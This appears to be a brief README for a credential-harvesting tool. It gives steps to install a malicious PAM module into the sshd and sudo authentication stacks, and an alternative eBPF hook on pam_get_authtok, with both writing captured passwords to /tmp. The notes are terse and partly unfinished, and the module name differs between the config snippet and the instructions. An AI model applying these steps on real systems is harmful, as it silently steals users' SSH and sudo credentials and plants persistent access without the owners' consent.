# PAM MODULE INTERCEPT


* make
* sudo cp pam_spit.so /lib64/security/ <- depends on distro
* sudo vi /etc/pam.d/sshd <- for ssh
* sudo vi /etc/pam.d/sudo <- for sudo
* sudo vi /etc/pam.d/* <- etc etc

```
auth       substack     password-auth
auth       include      postlogin
auth       optional     spit_pam.so
```
* auth optional pam_spit.so <- line needs to be added before auth is complete usually after postlogin or something could also be put in common-auth
* written to /tmp





# LIBBPF Hooking pamget_authtok
* relies on some library todo check which one
* cd ./libbpf-bootstrap/examples/c/
* make spit
* needs research on static build
* sudo ./spit 
* creds written to /tmp
